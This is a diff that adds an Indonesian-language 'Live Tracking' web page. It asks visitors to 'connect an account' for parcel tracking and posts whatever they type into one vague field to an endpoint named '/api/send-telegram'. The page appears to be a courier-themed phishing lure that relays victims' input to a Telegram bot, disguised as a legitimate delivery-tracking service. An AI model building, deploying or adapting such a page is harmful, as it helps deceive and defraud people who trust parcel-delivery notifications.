@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#ffffff">
+  <meta name="description" content="Halaman Live Tracking untuk melanjutkan ke layanan pelacakan pesanan.">
+  <title>Live Tracking</title>
+  <style>
+    :root {
+      --green: #198b45;
+      --green-dark: #14763a;
+      --ink: #111827;
+      --muted: #52617a;
+      --line: #b9b9b9;
+      --red: #ed1c2a;
+      --orange: #f5a13a;
+    }
+    * { box-sizing: border-box; }
+    html, body { margin: 0; min-height: 100%; }
+    body {
+      min-height: 100vh;
+      min-height: 100dvh;
+      background: #fff;
+      color: var(--ink);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      -webkit-font-smoothing: antialiased;
+    }
+    .page {
+      width: 100%;
+      max-width: 440px;
+      min-height: 100vh;
+      min-height: 100dvh;
+      margin: 0 auto;
+      display: flex;
+      flex-direction: column;
+      padding: max(20px, env(safe-area-inset-top)) 18px max(14px, env(safe-area-inset-bottom));
+    }
+    .main { flex: 1; display: flex; flex-direction: column; }
+    .illustration {
+      width: 100%;
+      max-width: 220px;
+      height: auto;
+      display: block;
+      margin: 18px auto 18px;
+    }
+    h1 {
+      margin: 0;
+      text-align: center;
+      font-size: clamp(23px, 5.6vw, 30px);
+      line-height: 1.18;
+      letter-spacing: -1.15px;
+      font-weight: 750;
+    }
+    .subtitle {
+      max-width: 430px;
+      margin: 12px auto 20px;
+      color: var(--muted);
+      text-align: center;
+      font-size: clamp(14px, 3.7vw, 17px);
+      line-height: 1.55;
+    }
+    form { width: 100%; }
+    .field {
+      display: block;
+      width: 100%;
+      height: 52px;
+      border: 1.5px solid var(--line);
+      border-radius: 10px;
+      background: #fff;
+      color: var(--ink);
+      padding: 0 13px;
+      font: inherit;
+      font-size: 15px;
+      outline: none;
+      transition: border-color .15s ease, box-shadow .15s ease;
+    }
+    .field:focus {
+      border-color: var(--green);
+      box-shadow: 0 0 0 3px rgba(25,139,69,.12);
+    }
+    .field::placeholder { color: #8b93a1; }
+    .next {
+      width: 100%;
+      min-height: 52px;
+      margin-top: 14px;
+      border: 0;
+      border-radius: 12px;
+      background: var(--green);
+      color: #fff;
+      font: inherit;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      box-shadow: 0 3px 0 rgba(0,0,0,.04);
+      transition: background .15s ease, transform .1s ease;
+    }
+    .next:active { transform: translateY(1px); background: var(--green-dark); }
+    .next:focus-visible { outline: 3px solid rgba(25,139,69,.3); outline-offset: 3px; }
+    .notice {
+      min-height: 42px;
+      margin: 10px 0 0;
+      color: #b42318;
+      font-size: 13px;
+      line-height: 1.4;
+      text-align: center;
+    }
+    footer {
+      margin-top: 22px;
+      padding: 12px 2px 0;
+      color: var(--muted);
+      text-align: center;
+      font-size: 11px;
+      line-height: 1.55;
+    }
+    @media (min-height: 800px) {
+      .illustration { margin-top: 26px; margin-bottom: 22px; }
+      .subtitle { margin-bottom: 22px; }
+      footer { margin-top: 30px; }
+    }
+    @media (max-width: 360px) {
+      .page { padding-left: 17px; padding-right: 17px; }
+      .illustration { max-width: 230px; margin-top: 14px; }
+      .field, .next { min-height: 56px; height: 56px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <section class="main" aria-labelledby="page-title">
+      <svg class="illustration" viewBox="0 0 320 270" role="img" aria-label="Ilustrasi pin lokasi dan paket dengan jalur pelacakan" xmlns="http://www.w3.org/2000/svg">
+        <path d="M74 58 H202 Q248 58 248 99 V109 Q248 142 216 142 H184" fill="none" stroke="#b8b8b8" stroke-width="5" stroke-linecap="round" stroke-dasharray="3 12"/>
+        <path d="M104 177 H68 Q34 177 34 146 Q34 118 62 118 H92" fill="none" stroke="#b8b8b8" stroke-width="5" stroke-linecap="round" stroke-dasharray="3 12"/>
+        <ellipse cx="74" cy="65" rx="17" ry="7" fill="none" stroke="#ed1c2a" stroke-width="3"/>
+        <path d="M74 10 C60 10 49 21 49 35 C49 55 74 77 74 77 S99 55 99 35 C99 21 88 10 74 10Z" fill="#ed1c2a"/>
+        <circle cx="74" cy="35" r="12" fill="#fff"/>
+        <circle cx="74" cy="35" r="7" fill="#ed1c2a"/>
+        <ellipse cx="191" cy="230" rx="46" ry="17" fill="none" stroke="#ed1c2a" stroke-width="7"/>
+        <path d="M191 76 C160 76 135 101 135 132 C135 177 191 225 191 225 S247 177 247 132 C247 101 222 76 191 76Z" fill="#ed1c2a"/>
+        <circle cx="191" cy="132" r="39" fill="#fff"/>
+        <g transform="translate(160 102)">
+          <path d="M0 15 29 0 57 15 29 32Z" fill="#ffb64d"/>
+          <path d="M0 15 29 32 V66 L0 49Z" fill="#f3a33c"/>
+          <path d="M29 32 57 15 V49 L29 66Z" fill="#e88719"/>
+          <path d="M14 22 42 7 49 11 21 27Z" fill="#d9851e"/>
+          <path d="M14 22 V53 L21 57 V27Z" fill="#d9851e"/>
+        </g>
+      </svg>
+
+      <h1 id="page-title">Hubungkan Ke Live Tracking</h1>
+      <p class="subtitle">Hubungkan akun ke layanan live tracking untuk pantau lokasi pesananmu.</p>
+
+      <form id="tracking-form" novalidate>
+        <label for="tracking-code" style="position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border:0;">Kode atau informasi tracking</label>
+        <input class="field" id="tracking-code" name="tracking-code" type="text" autocomplete="off" aria-label="Kode atau informasi tracking" required>
+        <button class="next" type="submit">Selanjutnya</button>
+        <p class="notice" id="notice" aria-live="polite"></p>
+      </form>
+    </section>
+    <footer>
+      Info penting: untuk dapat menggunakan layanan live tracking,<br>
+      pastikan kamu sudah memenuhi syarat pengiriman.
+    </footer>
+  </main>
+  <script>
+    const form = document.getElementById("tracking-form");
+    const field = document.getElementById("tracking-code");
+    const button = form.querySelector("button[type=submit]");
+    const notice = document.getElementById("notice");
+
+    form.addEventListener("submit", async function (event) {
+      event.preventDefault();
+      notice.textContent = "";
+
+      const trackingCode = field.value.trim();
+      if (!trackingCode) {
+        notice.textContent = "Silakan isi kolom terlebih dahulu.";
+        field.focus();
+        return;
+      }
+
+      button.disabled = true;
+      button.textContent = "Mengirim...";
+
+      try {
+        const result = await fetch("/api/send-telegram", {
+          method: "POST",
+          headers: { "content-type": "application/json" },
+          body: JSON.stringify({ trackingCode }),
+        });
+
+        if (!result.ok) throw new Error("send-failed");
+        notice.style.color = "#198b45";
+        notice.textContent = "Data berhasil dikirim.";
+        form.reset();
+      } catch (_) {
+        notice.style.color = "#b42318";
+        notice.textContent = "Data belum terkirim. Silakan coba lagi.";
+      } finally {
+        button.disabled = false;
+        button.textContent = "Selanjutnya";
+      }
+    });
+  </script>
+</body>
+</html>
